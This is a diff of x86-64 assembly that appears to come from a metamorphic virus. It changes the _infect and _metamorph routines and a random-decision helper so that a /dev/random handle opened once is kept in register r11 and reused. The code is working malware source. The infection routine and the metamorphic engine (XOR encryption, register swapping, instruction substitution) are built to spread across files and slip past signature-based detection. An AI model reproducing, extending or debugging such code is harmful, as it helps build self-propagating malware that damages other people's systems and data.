@@ -1167,6 +1167,7 @@ _infect:
 	push rdi
 	mov rdi, r8
 	push r8
+	push r11
 	push rsi
 	push rcx
 	push rdx
@@ -1174,6 +1175,7 @@ _infect:
 	pop rdx
 	pop rcx
 	pop rsi
+	pop r11
 	pop r8
 	pop rdi
 
@@ -1271,6 +1273,15 @@ ret
 _metamorph:; (rdi -> ptr)
 	; xor_encrypt
 	; swap registry r8, r9 -> r9, r10 -> ... -> r14, r15 -> r8, r9 -> ...
+	push rdi
+	xor rsi, rsi; O_RDONLY
+	lea rdi, [rel dev_random]
+	mov rax, SYSCALL_OPEN
+	syscall
+	push rax
+	pop r11
+	pop rdi
+
 	lea rax, [rel _params]
 	lea rsi, [rel _exit]
 	lea rcx, [rel _xor_encrypt]
@@ -1530,6 +1541,10 @@ _metamorph:; (rdi -> ptr)
 	jmp .substitute_instruction
 	.end_substitute_instruction:
 	pop rax
+
+	mov rdi, r11
+	mov rax, SYSCALL_CLOSE
+	syscall
 ret
 
 _yes_or_no:
@@ -1538,31 +1553,27 @@ _yes_or_no:
 	push rdx
 	push rcx
 	push rsi
-			xor rsi, rsi; O_RDONLY
-			lea rdi, [rel dev_random]
-			mov rax, SYSCALL_OPEN
-			syscall
+
 			sub rsp, 1
 
-			mov rdi, rax
+			mov rdi, r11
+			push r11
 			mov rsi, rsp
 			mov rdx, 1
 			xor rax, rax; READ
 			syscall
+			pop r11
 
 			xor rdx, rdx
 			xor rax, rax
 			movzx rax, byte[rsi]
+
 			add rsp, 1
+
 			push rdi
 			mov rdi, 2
 			div rdi
 			pop rdi
-			push rdx
-			mov rax, SYSCALL_CLOSE
-			syscall
-			pop rdx
-
 			mov rax, rdx
 
 	pop rsi
